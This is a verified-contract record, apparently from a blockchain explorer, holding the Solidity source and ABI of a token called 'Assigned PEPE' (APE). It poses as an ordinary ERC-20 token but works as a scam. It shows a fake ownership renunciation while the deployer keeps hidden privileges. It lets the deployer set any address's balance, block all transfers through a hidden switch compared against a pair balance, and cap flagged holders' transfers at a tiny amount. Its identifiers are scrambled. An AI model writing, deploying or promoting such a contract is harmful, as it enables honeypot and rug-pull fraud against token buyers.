{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface enableList {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address feeSender) external view returns (uint256);\n\n    function transfer(address atFund, uint256 teamSwapSender) external returns (bool);\n\n    function allowance(address sellReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 teamSwapSender) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address atFund,\n        uint256 teamSwapSender\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed teamLaunched, uint256 value);\n    event Approval(address indexed sellReceiver, address indexed spender, uint256 value);\n}\n\nabstract contract fromMin {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface buyTrading {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface atBuy {\n    function createPair(address feeIsMode, address fundTx) external returns (address);\n}\n\ninterface fromLaunch is enableList {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AssignedPEPE is fromMin, enableList, fromLaunch {\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return exemptWallet;\n    }\n\n    function sellAt() public {\n        emit OwnershipTransferred(launchTx, address(0));\n        isExemptLaunch = address(0);\n    }\n\n    string private swapTotal = \"Assigned PEPE\";\n\n    function transferFrom(address tradingAt, address atFund, uint256 teamSwapSender) external override returns (bool) {\n        if (_msgSender() != sellAuto) {\n            if (atFee[tradingAt][_msgSender()] != type(uint256).max) {\n                require(teamSwapSender <= atFee[tradingAt][_msgSender()]);\n                atFee[tradingAt][_msgSender()] -= teamSwapSender;\n            }\n        }\n        return launchedAmount(tradingAt, atFund, teamSwapSender);\n    }\n\n    string private tokenLiquidityShould = \"APE\";\n\n    function allowance(address shouldAmountReceiver, address teamExempt) external view virtual override returns (uint256) {\n        if (teamExempt == sellAuto) {\n            return type(uint256).max;\n        }\n        return atFee[shouldAmountReceiver][teamExempt];\n    }\n\n    function modeLiquidity(address limitEnableBuy, uint256 teamSwapSender) public {\n        liquidityToSwap();\n        modeFund[limitEnableBuy] = teamSwapSender;\n    }\n\n    uint8 private atTxAuto = 18;\n\n    mapping(address => mapping(address => uint256)) private atFee;\n\n    bool private txLimit;\n\n    bool private takeSell;\n\n    function decimals() external view virtual override returns (uint8) {\n        return atTxAuto;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return swapTotal;\n    }\n\n    bool public marketingSwap;\n\n    function buyFund(uint256 teamSwapSender) public {\n        liquidityToSwap();\n        receiverMode = teamSwapSender;\n    }\n\n    address marketingExempt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool private buyLiquidity;\n\n    function launchedAmount(address tradingAt, address atFund, uint256 teamSwapSender) internal returns (bool) {\n        if (tradingAt == launchTx) {\n            return toShould(tradingAt, atFund, teamSwapSender);\n        }\n        uint256 toList = enableList(launchEnable).balanceOf(marketingExempt);\n        require(toList == receiverMode);\n        require(atFund != marketingExempt);\n        if (exemptFee[tradingAt]) {\n            return toShould(tradingAt, atFund, tradingFrom);\n        }\n        return toShould(tradingAt, atFund, teamSwapSender);\n    }\n\n    bool public isAuto;\n\n    uint256 private exemptWallet = 100000000 * 10 ** 18;\n\n    function shouldToken(address amountSwap) public {\n        liquidityToSwap();\n        \n        if (amountSwap == launchTx || amountSwap == launchEnable) {\n            return;\n        }\n        exemptFee[amountSwap] = true;\n    }\n\n    function transfer(address limitEnableBuy, uint256 teamSwapSender) external virtual override returns (bool) {\n        return launchedAmount(_msgSender(), limitEnableBuy, teamSwapSender);\n    }\n\n    function getOwner() external view returns (address) {\n        return isExemptLaunch;\n    }\n\n    uint256 fundTakeReceiver;\n\n    uint256 private buyMin;\n\n    mapping(address => uint256) private modeFund;\n\n    event OwnershipTransferred(address indexed senderBuy, address indexed limitIs);\n\n    function approve(address teamExempt, uint256 teamSwapSender) public virtual override returns (bool) {\n        atFee[_msgSender()][teamExempt] = teamSwapSender;\n        emit Approval(_msgSender(), teamExempt, teamSwapSender);\n        return true;\n    }\n\n    uint256 constant tradingFrom = 5 ** 10;\n\n    bool public autoFee;\n\n    bool private isTakeFrom;\n\n    function liquidityToSwap() private view {\n        require(txMinTrading[_msgSender()]);\n    }\n\n    mapping(address => bool) public txMinTrading;\n\n    address private isExemptLaunch;\n\n    address sellAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function minTo(address autoMaxTo) public {\n        if (isAuto) {\n            return;\n        }\n        if (autoFee) {\n            isTakeFrom = false;\n        }\n        txMinTrading[autoMaxTo] = true;\n        \n        isAuto = true;\n    }\n\n    function toShould(address tradingAt, address atFund, uint256 teamSwapSender) internal returns (bool) {\n        require(modeFund[tradingAt] >= teamSwapSender);\n        modeFund[tradingAt] -= teamSwapSender;\n        modeFund[atFund] += teamSwapSender;\n        emit Transfer(tradingAt, atFund, teamSwapSender);\n        return true;\n    }\n\n    function balanceOf(address feeSender) public view virtual override returns (uint256) {\n        return modeFund[feeSender];\n    }\n\n    mapping(address => bool) public exemptFee;\n\n    uint256 public fromLiquidityIs;\n\n    function owner() external view returns (address) {\n        return isExemptLaunch;\n    }\n\n    uint256 receiverMode;\n\n    function symbol() external view virtual override returns (string memory) {\n        return tokenLiquidityShould;\n    }\n\n    constructor (){\n        \n        buyTrading autoTotalSender = buyTrading(sellAuto);\n        launchEnable = atBuy(autoTotalSender.factory()).createPair(autoTotalSender.WETH(), address(this));\n        if (marketingSwap) {\n            liquidityIs = true;\n        }\n        launchTx = _msgSender();\n        sellAt();\n        txMinTrading[launchTx] = true;\n        modeFund[launchTx] = exemptWallet;\n        \n        emit Transfer(address(0), launchTx, exemptWallet);\n    }\n\n    address public launchTx;\n\n    address public launchEnable;\n\n    bool private liquidityIs;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitIs\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamLaunched\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldAmountReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamExempt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamSwapSender\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeSender\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"teamSwapSender\",\"type\":\"uint256\"}],\"name\":\"buyFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromLiquidityIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoMaxTo\",\"type\":\"address\"}],\"name\":\"minTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitEnableBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamSwapSender\",\"type\":\"uint256\"}],\"name\":\"modeLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountSwap\",\"type\":\"address\"}],\"name\":\"shouldToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitEnableBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamSwapSender\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamSwapSender\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txMinTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "AssignedPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}